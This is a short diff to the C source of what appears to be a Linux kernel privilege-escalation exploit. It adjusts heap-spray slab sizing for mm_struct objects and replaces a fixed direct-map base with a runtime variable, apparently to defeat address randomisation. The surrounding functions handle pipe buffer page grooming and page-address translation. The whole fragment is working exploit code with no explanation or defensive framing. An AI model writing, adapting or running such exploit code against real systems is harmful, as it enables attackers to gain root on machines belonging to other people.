@@ -120,7 +120,7 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx spray;
   struct mm_ctx pre;
   struct mm_ctx post;
-  size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  size_t objs_per_slab = ORDER3_SIZE / 0x388; /* spray sizing uses real mm_struct size */
 
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
@@ -312,7 +312,8 @@ void reset_pipe_attempt(void) {
 }
 
 uintptr_t direct_to_page(uintptr_t addr) {
-  uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
+  extern uintptr_t g_direct_map_base;
+  uintptr_t pfn = (addr - g_direct_map_base) >> PAGE_SHIFT;
   return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
 }
 
@@ -327,8 +328,9 @@ uintptr_t direct_to_head_page(int fd, uintptr_t addr) {
 }
 
 uintptr_t page_to_direct(uintptr_t page) {
+  extern uintptr_t g_direct_map_base;
   uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
-  return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
+  return g_direct_map_base + (pfn << PAGE_SHIFT);
 }
 
 uintptr_t pipe_buf_ops_addr(void) {
